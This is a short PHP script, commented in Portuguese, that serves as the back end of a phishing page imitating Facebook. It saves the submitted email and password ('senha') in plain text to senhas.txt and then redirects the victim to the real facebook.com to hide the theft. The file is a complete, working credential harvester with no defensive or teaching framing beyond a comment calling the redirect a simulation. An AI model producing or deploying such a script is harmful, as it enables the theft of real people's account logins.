<?php
  $email = $_POST['email'];
  $senha = $_POST['senha'];
  $file = fopen("senhas.txt", "a");
  fwrite($file, "Email: $email - Senha: $senha\n");
  fclose($file);

  // Redireciona para o site oficial (simulação)
  header("Location: https://www.facebook.com");
  exit();
?>
